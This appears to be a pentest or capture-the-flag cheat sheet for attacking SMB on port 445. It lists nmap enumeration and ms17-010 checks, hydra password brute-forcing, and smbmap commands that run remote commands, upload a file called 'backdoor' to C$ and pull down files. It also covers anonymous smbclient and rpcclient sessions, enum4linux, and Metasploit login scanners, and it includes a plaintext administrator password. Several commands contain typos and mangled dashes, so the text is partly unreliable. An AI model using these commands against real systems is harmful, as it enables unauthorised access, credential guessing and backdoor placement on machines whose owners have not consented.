# **SMB**

## **Server Message Block 445**

> net use * /delete

```
$ net use z: \\10.4.17.133\c$ smbserver_771 /user:administrator 

> | Username | Password | | administrator | smbserver_771 |
```

--------------------------------------------------------------------

### Some Scans with Nmap

```
$ nmap 0.0.0.0 -sV -p …

$ nmap 0.0.0.0 -sU —top-port 25 —open

$ nmap 0.0.0.0 -sU —top-port 25 —open -sV
```

--------------------------------------------------------------------

### Some scripts for nmap

```
$ nmap 0.0.0.0 -p 445 —script smb-os-discovery

$ nmap -p445 —script smb-protocols 0.0.0.0

$ nmap -p445 —script smb-security-mode 0.0.0.0

$ nmap -p445 —script smb-enum-sessions 0.0.0.0 

$ nmap -p445 —script smb-enum-sessions —script-args username=administrator, password=smbserver_771 0.0.0.0

$ nmap -p445 —script smb-enum-shares 0.0.0.0 

$ nmap -p445 —script smb-vuln-ms17-010 0.0.0.0

$ nmap -p445 —script smb-enum-shares —script-args username=administrator, password=smbserver_771 0.0.0.0

$ nmap -p445 —script smb-enum-users —script-args username=administrator, password=smbserver_771 0.0.0.0

$ nmap -p445 —script smb-enum-stats —script-args username=administrator, password=smbserver_771 0.0.0.0

$ nmap -p445 —script smb-enum-domains —script-args username=administrator, password=smbserver_771 0.0.0.0

$ nmap -p445 —script smb-enum-groups —script-args username=administrator, password=smbserver_771 0.0.0.0

$ nmap -p445 —script smb-enum-services —script-args username=administrator, password=smbserver_771 0.0.0.0

$ nmap -p445 —script smb-enum-shares,smb-ls —script-args username=administrator, password=smbserver_771 0.0.0.0
```

--------------------------------------------------------------------

### BRUTEFORCE

```
$ hydra -l admin -P /usr/shar/wordlists/rockyou.txt 0.0.0.0 smb
```


--------------------------------------------------------------------

### smbmap

```
$ smbmap -u guest -p “” -d . -H 0.0.0.0

$ smbmap -H 0.0.0.0 -u administrator -p smbserver_771 -x ‘ipconfig’

$ smbmap -H 0.0.0.0 -u administrator -p ‘smbserver_771’ -L

$ smbmap -H 0.0.0.0 -u administrator -p ‘smbserver_771’ -r ‘C$’

$ smbmap -H 0.0.0.0 -u administrator -p ‘smbserver_771’ —upload ‘/root/backdoor’ ‘C$\backdoor’

$ smbmap -H 0.0.0.0 -u administrator -p ‘smbserver_771’ —downlaod ‘C$\flag.txt’

$ smbmap -H 0.0.0.0 -u admin -p password1
```

--------------------------------------------------------------------

### smbclient

```
$ smbclient -L 0.0.0.0 -N  (-N = No pass) —> anonymous session allowed?

$ smbclient //0.0.0.0/Public -N
> ls
> cd secret
> get flag

$ smb client -L 0.0.0.0 -U jane
> password

$ smbclient //0.0.0.0/jane -U jane 
> password
```

--------------------------------------------------------------------

### enum4linux

```
$ enum4linux -o 0.0.0.0

$ enum4linux -U 0.0.0.0 (Users)

$ enum4linux -S 0.0.0.0 (Shares)

$ enum4linux -G 0.0.0.0 (Groups)

$ enum4linux -i 0.0.0.0 (Info)

$ enum4linux -r -u “admin” -p “password1”

$ enum4linux -u vagrant -p vagrant -U 0.0.0.0
```

--------------------------------------------------------------------

### rpcclient

```
$ rpcclient -U “” -N 0.0.0.0 (blank user and no pass) —> anonymous session allowed?
> srvinfo
> enumdomusers
> lookupnames admin
> enumdomgroups
```

--------------------------------------------------------------------

### Metasploit Enumeration

```
$ msfconsole

use auxiliary/scanner/smb/smb_version

use auxiliary/scanner/smb/smb2 (see if is vulnerable)

use auxiliary/scanner/smb/smb_enumshares

use /auxiliary/scanner/smb/smb_login
>set passwordlist, user and host

use auxiliary/scanner/smb/pipe_auditor
>set user, pass and host
```

--------------------------------------------------------------------

### nmblookup

```
$ nmblookup -A 0.0.0.0
```


